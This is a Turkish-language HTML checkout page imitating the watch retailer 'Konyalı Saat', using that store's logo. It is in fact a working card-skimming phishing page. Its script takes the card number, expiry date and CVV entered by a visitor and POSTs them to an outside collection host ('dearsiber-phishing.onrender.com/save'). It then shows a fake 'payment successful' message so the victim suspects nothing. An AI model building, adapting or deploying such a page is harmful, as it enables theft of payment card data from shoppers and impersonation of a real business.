<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konyalı Saat - Ödeme Sayfası</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background: #f4f4f4; color: #333; }
        .container { max-width: 500px; margin: 50px auto; background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 20px; }
        .header img { width: 150px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #d32f2f; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
        button:hover { background: #b71c1c; }
        .loading { display: none; text-align: center; margin: 20px 0; }
        .success { display: none; color: green; text-align: center; font-size: 18px; }
        .error { display: none; color: red; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://www.konyalisaat.com.tr/wp-content/uploads/2023/05/logo.png" alt="Konyalı Saat">
            <h2>Ödeme Sayfası</h2>
            <p>Toplam: <strong>2.499 TL</strong></p>
        </div>

        <form id="payment-form">
            <div class="form-group">
                <label>Kart Numarası</label>
                <input type="text" id="card-number" placeholder="5400 6170 0477 0430" maxlength="19" required>
            </div>
            <div class="form-group">
                <label>Son Kullanma Tarihi</label>
                <input type="text" id="expiry" placeholder="12/2025" required>
            </div>
            <div class="form-group">
                <label>CVV</label>
                <input type="text" id="cvv" placeholder="000" maxlength="3" required>
            </div>
            <button type="submit">ÖDE & TAMAMLA</button>
        </form>

        <div class="loading" id="loading">
            <p>Ödeme işleniyor... Lütfen bekleyin</p>
        </div>
        <div class="success" id="success">
            Ödeme Başarılı! Siparişiniz alındı.
        </div>
        <div class="error" id="error">
            Hata! Kart bilgileriniz kontrol ediliyor...
        </div>
    </div>

    <script>
        // Kart formatlama
        document.getElementById('card-number').addEventListener('input', function(e) {
            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let matches = v.match(/\d{4,16}/g);
            let match = matches && matches[0] || '';
            let parts = [];
            for (let i=0; i<match.length; i+=4) {
                parts.push(match.substring(i, i+4));
            }
            if (parts.length) {
                e.target.value = parts.join(' ');
            } else {
                e.target.value = v;
            }
        });

        document.getElementById('payment-form').addEventListener('submit', async function(e) {
            e.preventDefault();

            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;

            // Format: 5400617004770430|12|2025|000
            const cardData = `${cardNumber}|${expiry}|${cvv}`;

            document.getElementById('loading').style.display = 'block';
            document.getElementById('payment-form').style.display = 'none';

            try {
                const response = await fetch('https://dearsiber-phishing.onrender.com/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ card: cardData })
                });

                if (response.ok) {
                    setTimeout(() => {
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('success').style.display = 'block';
                    }, 2000);
                } else {
                    throw new Error();
                }
            } catch (err) {
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('error').style.display = 'block';
                }, 2000);
            }
        });
    </script>
</body>
</html>
